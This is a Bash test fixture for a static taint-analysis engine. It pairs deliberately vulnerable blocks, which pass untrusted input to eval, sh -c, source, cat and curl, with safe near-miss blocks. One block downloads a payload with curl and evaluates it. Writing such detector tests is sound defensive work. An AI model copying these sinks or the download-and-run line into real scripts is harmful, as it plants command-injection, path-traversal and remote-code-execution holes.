#!/usr/bin/env bash
# Positive fixture for the Bash taint engine. Each block flows an untrusted
# shell source (positional/special parameter, `read` stdin, or a `$(curl/cat)`
# substitution) into a command-execution sink. The NEAR MISS blocks at the
# bottom must NOT fire.

# POSITIVE: positional parameter -> eval.
eval "$1"

# POSITIVE: special parameter $@ -> bash -c.
bash -c "$@"

# POSITIVE: read stdin -> sh -c.
read userinput
sh -c "$userinput"

# POSITIVE: $(curl ...) -> eval (download-and-run).
remote=$(curl -s http://example.com/payload)
eval "$remote"

# POSITIVE: $(cat ...) -> source (file content executed).
contents=$(cat /tmp/userfile)
source "$contents"

# POSITIVE inside a function: positional parameter -> eval.
run_it() {
  eval "$1"
}

# POSITIVE (path traversal): tainted parameter -> cat an arbitrary file.
userfile="$1"
cat "$userfile"

# POSITIVE (SSRF): tainted parameter -> curl an arbitrary URL.
target_url="$2"
curl -s "$target_url"

# NEAR MISS: literal argument, no expansion.
eval "ls -la"

# NEAR MISS: clean literal assignment reaching the sink.
safe_cmd="ls"
eval "$safe_cmd"

# NEAR MISS: printf %q shell-quotes the parameter before it reaches eval.
quoted=$(printf '%q' "$1")
eval "$quoted"

# NEAR MISS (path traversal): literal file path, nothing tainted.
cat /etc/hostname

# NEAR MISS (SSRF): fixed URL, no request input.
curl -s https://status.example.com/health
